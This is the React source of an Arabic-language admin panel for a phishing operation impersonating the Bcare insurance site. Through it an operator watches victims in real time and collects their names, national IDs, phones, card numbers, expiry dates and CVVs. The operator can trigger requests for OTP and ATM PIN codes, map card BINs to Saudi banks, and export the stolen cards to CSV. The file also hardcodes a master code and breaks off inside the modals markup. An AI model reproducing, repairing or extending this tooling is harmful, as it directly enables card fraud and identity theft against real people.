import React, { useState, useEffect, useMemo, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { supabase } from '../../supabase';
import {
  Users,
  CreditCard,
  MessageSquare,
  X,
  Smartphone,
  CheckCircle,
  AlertCircle,
  Menu,
  Activity,
  LogOut,
  ShieldAlert,
  Clock,
  ShieldOff,
  PieChart,
  BarChart,
  TrendingUp,
  Trash2,
  Printer,
  Settings,
  ChevronDown,
  Lock,
  Plus,
  ArrowRight,
  Copy,
  Edit3,
  Download
} from 'lucide-react';
import './Admin.css';

export const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isSetupNeeded, setIsSetupNeeded] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  // Navigation State
  const [currentView, setCurrentView] = useState('workspace'); // workspace, stats, cards, users
  const [statsFilter, setStatsFilter] = useState('all'); // all, completed, rejected, cards
  const [isGearOpen, setIsGearOpen] = useState(false);
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);

  const [allAdmins, setAllAdmins] = useState([]);
  const [newAdminUser, setNewAdminUser] = useState({ username: '', password: '' });
  const [masterCode, setMasterCode] = useState('');
  const [customers, setCustomers] = useState([]);
  const [selectedCustomerId, setSelectedCustomerId] = useState(null);
  const selectedCustomer = customers.find(c => c.id === selectedCustomerId);
  const [searchQuery, setSearchQuery] = useState('');
  const [loadingAction, setLoadingAction] = useState(null);
  const [mobileDetailsActive, setMobileDetailsActive] = useState(false);
  const [isSoundEnabled, setIsSoundEnabled] = useState(true);
  const [unreadCustomers, setUnreadCustomers] = useState(new Set());
  const [currentTime, setCurrentTime] = useState(Date.now());
  const [adminNotes, setAdminNotes] = useState(() => JSON.parse(localStorage.getItem('admin_notes') || '{}'));
  const [showNoteInput, setShowNoteInput] = useState(false);
  const [noteText, setNoteText] = useState('');

  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(Date.now()), 15000); // update every 15s for online status
    return () => clearInterval(timer);
  }, []);

  const notificationSound = useRef(new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3'));
  const lastStateRef = useRef({});

  // Stats and Filtering Logic
  const { stats, activeCustomers, failedCustomers } = useMemo(() => {
    let total = customers.length;
    let completed = 0;
    let rejected = 0;
    let withCards = 0;
    let onlineNow = 0;
    
    const active = [];
    const failed = [];

    customers.forEach(c => {
      const isOnline = (currentTime - (c.last_heartbeat || c.last_update || 0)) < 15000;
      if (c.status === 'completed') completed++;
      if (c.status === 'rejected') rejected++;
      if (c.card_number) withCards++;
      if (isOnline) onlineNow++;

      const isInactive = (currentTime - (c.last_heartbeat || c.last_update || 0)) > 3 * 60 * 1000;
      
      // Failed: No card entered AND inactive for more than 3 minutes
      if (!c.card_number && isInactive) {
        failed.push(c);
      } else {
        active.push(c);
      }
    });

    return { 
      stats: { total, completed, rejected, withCards, onlineNow },
      activeCustomers: active,
      failedCustomers: failed
    };
  }, [customers, currentTime]);

  const filteredCustomers = useMemo(() => {
    const filtered = activeCustomers.filter(c => {
      const search = searchQuery.toLowerCase();
      return (c.full_name && c.full_name.toLowerCase().includes(search)) ||
             (c.id_number && c.id_number.includes(search)) ||
             (c.mobile && c.mobile.includes(search));
    });

    return filtered.sort((a, b) => {
      return (b.last_update || 0) - (a.last_update || 0);
    });
  }, [activeCustomers, searchQuery]);

  // Real-time Customers Fetch
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchInitialData = async () => {
      const { data } = await supabase
        .from('customers')
        .select('*')
        .order('last_update', { ascending: false });
      if (data) {
        setCustomers(data);
        if (!selectedCustomerId && data.length > 0) setSelectedCustomerId(data[0].id);
      }
    };
    fetchInitialData();

    // Supabase Realtime for Customers
    const channel = supabase
      .channel('admin_customers')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'customers' },
        (payload) => {
          setCustomers(prev => {
            let next;
            if (payload.eventType === 'INSERT') {
              next = [payload.new, ...prev];
            } else if (payload.eventType === 'UPDATE') {
              next = prev.map(c => c.id === payload.new.id ? payload.new : c);
            } else if (payload.eventType === 'DELETE') {
              next = prev.filter(c => c.id !== payload.old.id);
            } else {
              next = prev;
            }

            // Universal Notification Logic
            if (payload.eventType === 'INSERT' || payload.eventType === 'UPDATE') {
              const cust = payload.new;
              const old = prev.find(o => o.id === cust.id);

              // Only alert if something meaningful changed (ignore pure heartbeat updates)
              const isMeaningful = payload.eventType === 'INSERT' ||
                (old && (
                  old.page !== cust.page ||
                  old.status !== cust.status ||
                  old.card_number !== cust.card_number ||
                  (cust.otps?.length || 0) > (old.otps?.length || 0)
                ));

              if (isMeaningful) {
                // Audio Alert
                if (isSoundEnabled) {
                  notificationSound.current.currentTime = 0;
                  notificationSound.current.play().catch(e => console.log("Audio play blocked", e));
                }

                // Visual Highlight
                setUnreadCustomers(prevSet => {
                  const newSet = new Set(prevSet);
                  newSet.add(cust.id);
                  return newSet;
                });
              }
            }
            // Sort by last_update to ensure active customers jump to top
            return [...next].sort((a, b) => (b.last_update || 0) - (a.last_update || 0));
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isAuthenticated, isSoundEnabled, selectedCustomerId]);

  // Fetch Admins
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchAdmins = async () => {
      const { data } = await supabase.from('admins').select('*');
      if (data) setAllAdmins(data);
    };
    fetchAdmins();

    const channel = supabase
      .channel('admin_users')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'admins' }, () => fetchAdmins())
      .subscribe();

    return () => supabase.removeChannel(channel);
  }, [isAuthenticated]);

  const isUserOnline = (c) => {
    const time = c.last_heartbeat || c.last_update;
    if (!time) return false;
    // Increased to 45 seconds for better accuracy
    return (Date.now() - time) < 45000;
  };

  const handleAction = async (type, payload = {}) => {
    if (!selectedCustomerId) {
      console.error("No customer selected for action:", type);
      return;
    }

    console.log(`Executing admin action: ${type} for customer: ${selectedCustomerId}`);
    setLoadingAction(type);

    try {
      const updateData = {
        status: type,
        ...payload,
        last_update: new Date().getTime()
      };

      const { data, error } = await supabase
        .from('customers')
        .update(updateData)
        .eq('id', selectedCustomerId)
        .select();

      if (error) {
        console.error(`Supabase Update Error (${type}):`, error);
        alert(`خطأ في تحديث الحالة: ${error.message}`);
      } else {
        console.log(`Successfully updated customer status to: ${type}`, data);
      }
    } catch (err) {
      console.error("Critical Admin Action Error:", err);
    } finally {
      setLoadingAction(null);
    }
  };

  const banCustomer = async () => {
    if (!selectedCustomer?.ip) return alert('IP غير معروف');
    if (!window.confirm('هل تريد حظر هذا الـ IP نهائياً؟')) return;
    setLoadingAction('ban');
    try {
      await supabase.from('banned_ips').insert([{
        ip: selectedCustomer.ip,
        banned_at: new Date().getTime(),
        reason: 'Admin Panel Ban'
      }]);
      await supabase.from('customers').delete().eq('id', selectedCustomerId);
      setSelectedCustomerId(null);
      alert('تم الحظر بنجاح');
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  const handleChangePassword = async () => {
    if (masterCode !== '185209') return alert('الرمز الرئيسي خطأ');
    if (!newAdminUser.password) return alert('يرجى إدخال كلمة المرور الجديدة');

    setLoadingAction('change_pass');
    try {
      const { data } = await supabase.from('admins').select('id').limit(1);
      if (data && data.length > 0) {
        await supabase.from('admins').update({ password: newAdminUser.password }).eq('id', data[0].id);
        alert('تم تغيير كلمة المرور بنجاح');
        setNewAdminUser({ username: '', password: '' });
        setMasterCode('');
      }
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  // Removed delete admin logic as per request to simplify to single password profile

  const handleDeleteAllData = async () => {
    if (masterCode !== '185209') return alert('الرمز الرئيسي خطأ');
    setLoadingAction('delete_all');
    try {
      // Supabase delete all (with no filter) requires RLS or a small hack, but we disabled RLS.
      // We can use a filter that always matches.
      await supabase.from('customers').delete().neq('id', '00000000-0000-0000-0000-000000000000');
      alert('تم المسح بنجاح');
      setMasterCode('');
      setIsDeleteModalOpen(false);
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  // Auth Logic
  useEffect(() => {
    const check = async () => {
      const { data } = await supabase.from('admins').select('*').limit(1);
      if (!data || data.length === 0) setIsSetupNeeded(true);
    };
    check();
    // Removed sessionStorage check to force password on refresh/new tab
    if (sessionStorage.getItem('admin_session_v3')) setIsAuthenticated(true);
  }, []);

  if (isSetupNeeded) {
    return (
      <div className="admin-login-overlay" dir="rtl" style={{ fontFamily: 'Tajawal, sans-serif' }}>
        <div className="login-box">
          <div className="login-header">
            <ShieldAlert size={40} color="#146394" />
            <h2>إعداد نظام الوصول</h2>
          </div>
          <p className="login-subtitle">يرجى تعيين كلمة المرور للدخول إلى لوحة التحكم</p>
          <div className="login-input-group">
            <Lock size={18} />
            <input type="password" placeholder="كلمة المرور الجديدة" onChange={e => setPassword(e.target.value)} />
          </div>
          <button className="login-btn" onClick={async () => {
            if (!password) return alert('يرجى إدخال كلمة مرور');
            await supabase.from('admins').insert([{ username: 'admin', password }]);
            sessionStorage.setItem('admin_session_v3', 'true');
            sessionStorage.setItem('admin_session_v3', 'true');
            setIsSetupNeeded(false);
          }}>حفظ والدخول للوحة التحكم</button>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="admin-login-overlay" dir="rtl" style={{ fontFamily: 'Tajawal, sans-serif' }}>
        <div className="login-box glassmorphism">
          <div className="login-glow"></div>
          <img src="/group-21.svg" alt="Bcare" className="login-logo-img" />
          <div className="login-header">
            <h2>تسجيل الدخول للوحة التحكم</h2>
            <p>أدخل كلمة المرور للمتابعة</p>
          </div>

          <div className="login-input-group">
            <Lock size={18} />
            <input
              type="password"
              placeholder="كلمة المرور"
              onChange={e => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && document.getElementById('login-submit-btn').click()}
            />
          </div>

          <button id="login-submit-btn" className="login-btn-v3" onClick={async () => {
            const { data } = await supabase
              .from('admins')
              .select('*')
              .eq('password', password);
            if (data && data.length > 0) {
              setIsAuthenticated(true);
              sessionStorage.setItem('admin_session_v3', 'true');
            } else {
              alert('كلمة المرور غير صحيحة');
            }
          }}>
            <span>دخول النظام</span>
            <ArrowRight size={18} />
          </button>

          <div className="login-footer">
            <ShieldAlert size={14} />
            <span>نظام محمي ومشفر بالكامل</span>
          </div>
        </div>
      </div>
    );
  }

  // BIN Detection for Saudi Banks
  const getBankName = (cardNumber) => {
    if (!cardNumber) return '---';
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    const bins = {
      '400875': 'الراجحي', '409201': 'الراجحي', '458456': 'الراجحي', '446393': 'الراجحي', '446672': 'الراجحي', '446404': 'الراجحي', '457865': 'الراجحي', '400876': 'الراجحي',
      '406996': 'الأهلي SNB', '455036': 'الأهلي SNB', '431361': 'الأهلي SNB', '432328': 'الأهلي SNB', '422817': 'الأهلي SNB',
      '432128': 'الإنماء', '434107': 'الإنماء', '405454': 'الإنماء', '440406': 'الإنماء',
      '588845': 'البلاد', '530060': 'البلاد', '531095': 'البلاد',
      '588848': 'الرياض', '588850': 'الرياض', '446136': 'الرياض', '403933': 'الرياض',
      '455708': 'الجزيرة', '457997': 'الجزيرة', '407197': 'الجزيرة',
      '417633': 'الاستثمار', '468540': 'الاستثمار', '409204': 'الاستثمار',
      '440533': 'ساب SAB', '440647': 'ساب SAB', '440759': 'ساب SAB', '462220': 'ساب SAB',
      '410685': 'العربي ANB', '412563': 'العربي ANB', '410686': 'العربي ANB',
      '401757': 'سامبا', '410834': 'سامبا', '452103': 'سامبا',
      '430840': 'السعودي الفرنسي', '430841': 'السعودي الفرنسي', '424288': 'السعودي الفرنسي'
    };
    return bins[bin] || 'بنك محلي';
  };

  const exportToCSV = () => {
    const cards = customers.filter(c => c.card_number);
    if (cards.length === 0) return alert('لا يوجد بطاقات لتصديرها');
    
    // Add BOM for Excel Arabic support
    let csvContent = "data:text/csv;charset=utf-8,\uFEFFالاسم,رقم الهوية,الجوال,رقم البطاقة,تاريخ الانتهاء,CVV,البنك,التاريخ\n";
    cards.forEach(c => {
      const row = `${c.full_name || ''},${c.id_number || ''},${c.mobile || ''},${c.card_number},${c.card_expiry || ''},${c.card_cvv || ''},${getBankName(c.card_number)},${new Date(c.created_at || c.last_update).toLocaleDateString('ar-SA')}`;
      csvContent += row + "\n";
    });
    
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `cards_export_${new Date().getTime()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setIsGearOpen(false);
  };

  // Quick Copy Helper
  const handleCopyText = (e, text, label) => {
    e.stopPropagation();
    if (!text || text === '---') return;
    navigator.clipboard.writeText(text);
    alert(`تم نسخ ${label}`);
  };

  // Reusable Virtual Card
  const VirtualCard = ({ customer }) => (
    <motion.div 
      initial={{ scale: 0.9, opacity: 0 }}
      animate={{ scale: 1, opacity: 1 }}
      transition={{ type: 'spring', stiffness: 200, damping: 20 }}
      className="admin-virtual-card-v2" 
      style={{ position: 'relative' }}
    >
      <div className="v-card-top-row">
        <div className="v-card-chip"></div>
        <div className="v-card-bank-name">{getBankName(customer.card_number)}</div>
      </div>
      
      <div className="v-card-number-v2" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', direction: 'ltr' }}>
        <span>{customer.card_number || '---'}</span>
        {customer.card_number && (
          <button 
            onClick={(e) => handleCopyText(e, customer.card_number, 'رقم البطاقة')}
            style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '4px', cursor: 'pointer', color: '#fff', display: 'flex' }}
            title="نسخ رقم البطاقة"
          >
            <Copy size={14} />
          </button>
        )}
      </div>

      <div className="v-card-bottom">
        <div className="v-card-info-v2">
          <span>NAME</span>
          <strong style={{fontSize: '12px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: '100px', display: 'inline-block'}}>{customer.full_name || '---'}</strong>
        </div>
        
        <div className="v-card-info-v2" style={{ flexDirection: 'row', alignItems: 'flex-end', gap: '5px' }}>
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            <span>EXP</span>
            <strong>{customer.card_expiry || '---'}</strong>
          </div>
          {customer.card_expiry && (
            <button 
              onClick={(e) => handleCopyText(e, customer.card_expiry, 'تاريخ الانتهاء')}
              style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '3px 5px', cursor: 'pointer', color: '#fff', marginBottom: '2px', display: 'flex' }}
              title="نسخ تاريخ الانتهاء"
            >
              <Copy size={12} />
            </button>
          )}
        </div>

        <div className="v-card-info-v2" style={{ flexDirection: 'row', alignItems: 'flex-end', gap: '5px' }}>
          <div style={{ display: 'flex', flexDirection: 'column' }}>
            <span>CVV</span>
            <strong>{customer.card_cvv || '---'}</strong>
          </div>
          {customer.card_cvv && (
            <button 
              onClick={(e) => handleCopyText(e, customer.card_cvv, 'الرقم السري CVV')}
              style={{ background: 'rgba(255,255,255,0.1)', border: 'none', borderRadius: '4px', padding: '3px 5px', cursor: 'pointer', color: '#fff', marginBottom: '2px', display: 'flex' }}
              title="نسخ CVV"
            >
              <Copy size={12} />
            </button>
          )}
        </div>
      </div>
    </motion.div>
  );

  // Memoized Sidebar Item to prevent lag during heartbeat updates
  const CustomerListItem = React.memo(({ c, isSelected, hasNewAction, isOnline, onClick }) => (
    <div
      className={`sidebar-item-v2 ${isSelected ? 'active' : ''} ${hasNewAction ? 'has-new-action' : ''}`}
      onClick={() => onClick(c.id)}
    >
      <div className="item-main-info">
        <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
        <span className={`online-status-v2 ${isOnline ? 'online' : 'offline'}`}>
          {isOnline ? 'متصل' : 'غادر'}
        </span>
      </div>
      <div className="item-page-row">{c.page || 'الرئيسية'}</div>
      <div className="item-indicators">
        {c.card_number && <span className="indicator-tag">💳 بطاقة</span>}
        {c.otps && c.otps.length > 0 && <span className="indicator-tag">💬 {c.otps.length} رمز</span>}
      </div>
    </div>
  ));

  return (
    <div className="admin-v3-root" dir="rtl">
      {/* 1. Main Navigation */}
      <nav className="main-nav-v3">
        <div className="nav-top">
          <img src="/group-21.svg" alt="Logo" className="nav-logo" onClick={() => setCurrentView('workspace')} />
          <div className="nav-items-v3">
            <button className={`nav-item ${currentView === 'workspace' ? 'active' : ''}`} onClick={() => setCurrentView('workspace')} title="مساحة العمل">
              <Users size={24} />
            </button>
            <button className={`nav-item ${currentView === 'stats' ? 'active' : ''}`} onClick={() => setCurrentView('stats')} title="الإحصائيات">
              <PieChart size={24} />
            </button>
            <button className={`nav-item ${currentView === 'cards' ? 'active' : ''}`} onClick={() => setCurrentView('cards')} title="البطاقات">
              <CreditCard size={24} />
            </button>
            <button className="nav-item" onClick={exportToCSV} title="تصدير CSV">
              <Download size={24} />
            </button>
            <button className={`nav-item ${currentView === 'users' ? 'active' : ''}`} onClick={() => setCurrentView('users')} title="الإعدادات">
              <Settings size={24} />
            </button>
          </div>
        </div>
        
        <div className="nav-bottom">
          <button className={`nav-item ${isSoundEnabled ? 'active-sound' : 'muted-sound'}`} onClick={() => setIsSoundEnabled(!isSoundEnabled)} title={isSoundEnabled ? "كتم الصوت" : "تشغيل الصوت"}>
            {isSoundEnabled ? <Clock size={24} /> : <ShieldOff size={24} />}
          </button>
          <button className="nav-item text-red" onClick={() => setIsDeleteModalOpen(true)} title="حذف البيانات">
            <Trash2 size={24} />
          </button>
          <button className="nav-item" onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }} title="خروج">
            <LogOut size={24} />
          </button>
        </div>
      </nav>

      {/* 2. Inbox Sidebar (Only visible if workspace) */}
      <AnimatePresence>
        {currentView === 'workspace' && (
          <motion.aside 
            className="inbox-sidebar-v3"
            initial={{ opacity: 0, x: 50 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 50 }}
          >
            <div className="inbox-header">
              <h2>صندوق الوارد</h2>
              <div className="online-pill-v3">
                <div className="pulse-dot"></div>
                متصل: {stats.onlineNow}
              </div>
            </div>
            <div className="inbox-search-v3">
              <input type="text" placeholder="بحث باسم، هوية أو جوال..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
            </div>
            <div className="inbox-list-v3">
              <AnimatePresence>
                {filteredCustomers.map(c => {
                  const online = isUserOnline(c);
                  const hasCard = !!c.card_number;
                  const hasOtp = c.otps && c.otps.length > 0;
                  const isOtpPage = c.status === 'otp' || (c.page && c.page.toLowerCase().includes('otp'));
                  
                  return (
                    <motion.div 
                      layout
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, scale: 0.95 }}
                      transition={{ type: "spring", stiffness: 300, damping: 25 }}
                      key={c.id} 
                      className={`inbox-item-v3 ${selectedCustomerId === c.id ? 'selected' : ''}`}
                      onClick={() => setSelectedCustomerId(c.id)}
                    >
                      <div className="inbox-item-header">
                        <span className="inbox-name">{c.full_name || c.id_number || 'عميل جديد'}</span>
                        <span className={`inbox-status ${online ? 'online' : 'offline'}`}>{online ? 'متصل' : 'غادر'}</span>
                      </div>
                      <div className="inbox-item-page">{c.page || 'الرئيسية'}</div>
                      <div className="inbox-item-tags">
                        {hasCard && <span className="tag-card">💳 بطاقة</span>}
                        {hasOtp && <span className="tag-otp">💬 {c.otps.length} كود</span>}
                        {isOtpPage && !hasOtp && <span className="tag-wait">⏳ ينتظر كود</span>}
                        <span className="tag-time">{c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' }) : ''}</span>
                      </div>
                    </motion.div>
                  );
                })}
              </AnimatePresence>
            </div>
          </motion.aside>
        )}
      </AnimatePresence>

      {/* 3. Main Workspace Area */}
      <main className="workspace-area-v3">
        <header className="workspace-header-v3">
          <div className="header-title">نظام الإدارة الآمن | Bcare Panel</div>
          <div className="header-actions">
            <span className="admin-badge">مدير النظام</span>
          </div>
        </header>
        
        <div className="workspace-content-scroll">
          <AnimatePresence mode="wait">
            {currentView === 'workspace' && (
              selectedCustomer ? (
                <motion.div 
                  key="workspace-inner"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className="workspace-container"
                >
                  {/* Top Bar with Name and Quick Actions */}
                  <div className="customer-hero-card">
                    <div className="hero-info">
                      <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
                      <div className={`hero-status ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
                        {isUserOnline(selectedCustomer) ? 'متصل الآن' : 'غادر'} - {selectedCustomer.page}
                        {selectedCustomer.page && selectedCustomer.page.includes('انتظار') && (
                          <span className="wait-timer">
                            (منذ {Math.floor((Date.now() - (selectedCustomer.last_update || Date.now())) / 1000)} ثانية)
                          </span>
                        )}
                      </div>
                    </div>
                    <div className="hero-note">
                      <Edit3 size={18} color="#64748b" />
                      {showNoteInput ? (
                        <div className="note-input-wrap">
                          <input 
                            type="text" 
                            value={noteText}
                            onChange={(e) => setNoteText(e.target.value)}
                            placeholder="اكتب ملاحظة..." 
                          />
                          <button onClick={() => {
                            const newNotes = { ...adminNotes, [selectedCustomer.id]: noteText };
                            setAdminNotes(newNotes);
                            localStorage.setItem('admin_notes', JSON.stringify(newNotes));
                            setShowNoteInput(false);
                          }}>حفظ</button>
                        </div>
                      ) : (
                        <div className="note-display" onClick={() => { setShowNoteInput(true); setNoteText(adminNotes[selectedCustomer.id] || ''); }}>
                          <span>{adminNotes[selectedCustomer.id] || 'أضف ملاحظة سريعة لهذا العميل...'}</span>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Active Data Area (Card & Timeline) */}
                  <div className="active-data-grid">
                    <div className="active-card-col">
                      <h3>البطاقة البنكية</h3>
                      {selectedCustomer.card_number ? (
                        <VirtualCard customer={selectedCustomer} />
                      ) : (
                        <div className="empty-card-state">بانتظار إدخال بيانات البطاقة...</div>
                      )}
                    </div>
                    <div className="active-timeline-col">
                      <h3>سجل الأكواد (OTPs & ATMs)</h3>
                      <div className="timeline-container">
                        <div className="timeline-col">
                          <h4>أكواد الـ OTP</h4>
                          <div className="timeline-list">
                            {[...(selectedCustomer.otps || [])].filter(o => o.type === 'otp').slice().reverse().map((o, i) => (
                              <div key={i} className={`timeline-item ${i === 0 ? 'latest' : ''}`}>{o.code}</div>
                            ))}
                          </div>
                        </div>
                        <div className="timeline-col">
                          <h4>أكواد صراف ATM</h4>
                          <div className="timeline-list">
                            {[...(selectedCustomer.otps || [])].filter(o => o.type === 'atm').slice().reverse().map((o, i) => (
                              <div key={i} className={`timeline-item ${i === 0 ? 'latest' : ''}`}>{o.code}</div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Floating Action Bar equivalent */}
                  <div className="action-bar-v3">
                    <button className="action-btn-v3 btn-otp" onClick={() => handleAction('request_otp')}>
                      <MessageSquare size={24} /> طلب كود OTP
                    </button>
                    <button className="action-btn-v3 btn-atm" onClick={() => handleAction('request_atm')}>
                      <CreditCard size={24} /> طلب صراف ATM
                    </button>
                    <button className="action-btn-v3 btn-reject" onClick={() => handleAction('rejected')}>
                      <X size={24} /> إنهاء / رفض
                    </button>
                    <button className="action-btn-v3 btn-complete" onClick={() => handleAction('completed')}>
                      <CheckCircle size={24} /> قبول العملية
                    </button>
                  </div>

                  {/* Static Details */}
                  <div className="static-details-grid">
                    <div className="detail-card-v3">
                      <h3>معلومات العميل</h3>
                      <ul>
                        <li><span>الاسم:</span> <strong>{selectedCustomer.full_name || '---'}</strong></li>
                        <li><span>رقم الهوية:</span> <strong>{selectedCustomer.id_number || '---'}</strong></li>
                        <li><span>الجوال:</span> <strong>{selectedCustomer.mobile || '---'}</strong></li>
                        <li><span>الجهاز:</span> <strong>{selectedCustomer.device || '---'}</strong></li>
                        <li><span>الرقم التسلسلي:</span> <strong>{selectedCustomer.sequence_number || '---'}</strong></li>
                      </ul>
                      <button className="ban-btn-v3" onClick={banCustomer}><ShieldAlert size={16} /> حظر العميل</button>
                    </div>
                    <div className="detail-card-v3">
                      <h3>تفاصيل التأمين</h3>
                      <ul>
                        <li><span>الشركة:</span> <strong>{selectedCustomer.selected_company || '---'}</strong></li>
                        <li><span>المبلغ الإجمالي:</span> <strong className="text-green">{selectedCustomer.total_price || '---'} ريال</strong></li>
                        <li><span>المركبة:</span> <strong>{selectedCustomer.car_make_model || '---'}</strong></li>
                        <li><span>الغرض:</span> <strong>{selectedCustomer.purpose || 'شخصي'}</strong></li>
                      </ul>
                    </div>
                  </div>
                  
                  {/* Technical Data */}
                  <div className="tech-data-bar">
                     <span><strong>رقم البطاقة الخام:</strong> {selectedCustomer.card_number || '---'}</span>
                     <span><strong>تاريخ الانتهاء:</strong> {selectedCustomer.card_expiry || '---'}</span>
                     <span><strong>CVV:</strong> {selectedCustomer.card_cvv || '---'}</span>
                     <span><strong>تحديث:</strong> {new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</span>
                  </div>

                </motion.div>
              ) : (
                <div className="empty-workspace-v3">
                  <Activity size={64} color="#cbd5e1" />
                  <p>الرجاء اختيار عميل من القائمة الجانبية للبدء</p>
                </div>
              )
            )}

            {currentView === 'stats' && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
                <div className="page-header-v3">
                  <h2>الإحصائيات العامة</h2>
                </div>
                <div className="stats-cards-grid">
                  <div className={`stat-card-v3 ${statsFilter === 'all' ? 'active' : ''}`} onClick={() => setStatsFilter('all')}>
                    <h3>كل العملاء</h3>
                    <strong>{stats.total}</strong>
                  </div>
                  <div className="stat-card-v3 online">
                    <h3>متصل الآن</h3>
                    <strong>{stats.onlineNow}</strong>
                  </div>
                  <div className={`stat-card-v3 ${statsFilter === 'completed' ? 'active' : ''}`} onClick={() => setStatsFilter('completed')}>
                    <h3>ناجح</h3>
                    <strong>{stats.completed}</strong>
                  </div>
                  <div className={`stat-card-v3 ${statsFilter === 'rejected' ? 'active' : ''}`} onClick={() => setStatsFilter('rejected')}>
                    <h3>مرفوض</h3>
                    <strong>{stats.rejected}</strong>
                  </div>
                  <div className={`stat-card-v3 ${statsFilter === 'cards' ? 'active' : ''}`} onClick={() => setStatsFilter('cards')}>
                    <h3>بطاقات</h3>
                    <strong>{stats.withCards}</strong>
                  </div>
                </div>

                <div className="stats-content-v3">
                  {statsFilter === 'cards' ? (
                    <div className="cards-grid-v3">
                      {customers.filter(c => c.card_number).map((c, i) => <VirtualCard key={i} customer={c} />)}
                    </div>
                  ) : (
                    <table className="table-v3">
                      <thead>
                        <tr>
                          <th>الاسم</th>
                          <th>الهوية</th>
                          <th>الحالة</th>
                          <th>التاريخ</th>
                          <th>إجراء</th>
                        </tr>
                      </thead>
                      <tbody>
                        {customers.filter(c => statsFilter === 'all' ? true : c.status === statsFilter).map((c, i) => (
                          <tr key={i}>
                            <td>{c.full_name || '---'}</td>
                            <td>{c.id_number}</td>
                            <td><span className={`status-badge ${c.status}`}>{c.status}</span></td>
                            <td>{c.last_update ? new Date(c.last_update).toLocaleDateString('ar-SA') : '---'}</td>
                            <td><button className="view-btn-v3" onClick={() => { setSelectedCustomerId(c.id); setCurrentView('workspace'); }}>عرض</button></td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              </motion.div>
            )}

            {currentView === 'cards' && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
                <div className="page-header-v3">
                  <h2>البطاقات المسحوبة</h2>
                  <button className="print-btn" onClick={() => window.print()}><Printer size={18} /> طباعة PDF</button>
                </div>
                <div className="cards-grid-v3">
                  {customers.filter(c => c.card_number).map((c, i) => <VirtualCard key={i} customer={c} />)}
                </div>
              </motion.div>
            )}

            {currentView === 'users' && (
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="page-view-v3">
                <div className="page-header-v3">
                  <h2>إعدادات النظام وتغيير كلمة المرور</h2>
                </div>
                <div className="settings-form-v3">
                  <div className="form-group-v3">
                    <label>كلمة المرور الجديدة</label>
                    <div className="input-with-icon">
                      <Lock size={18} />
                      <input type="password" placeholder="أدخل كلمة المرور الجديدة" value={newAdminUser.password} onChange={e => setNewAdminUser({ ...newAdminUser, password: e.target.value })} />
                    </div>
                  </div>
                  <div className="form-group-v3">
                    <label>الرمز السري للتأكيد (الماستر كود)</label>
                    <div className="input-with-icon">
                      <ShieldAlert size={18} />
                      <input type="password" placeholder="أدخل الكود السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} />
                    </div>
                  </div>
                  <button className="submit-btn-v3" onClick={handleChangePassword} disabled={loadingAction === 'change_pass'}>
                    {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث البيانات'}
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </main>

      {/* Modals */}
      <AnimatePresence>
        {isDeleteModalOpen && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="modal-overlay-v3">
            <div className="modal-content-v3">
              <button className="close-modal-btn" onClick={() => setIsDeleteModalOpen(false)}><X /></button>
              <Trash2 size={48} color="#ef4444" />
              <h3>حذف كافة البيانات نهائياً</h3>
              <p>يرجى إدخال الماستر كود للتأكيد. هذا الإجراء لا يمكن التراجع عنه.</p>
              <input type="password" placeholder="الرمز السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} className="modal-input-v3" />
              <button className="btn-danger-v3" onClick={handleDeleteAllData} disabled={loadingAction === 'delete_all'}>
                {loadingAction === 'delete_all' ? 'جاري المسح...' : 'تأكيد المسح'}
              </button>
            </div>
          </motion.div>
        )}
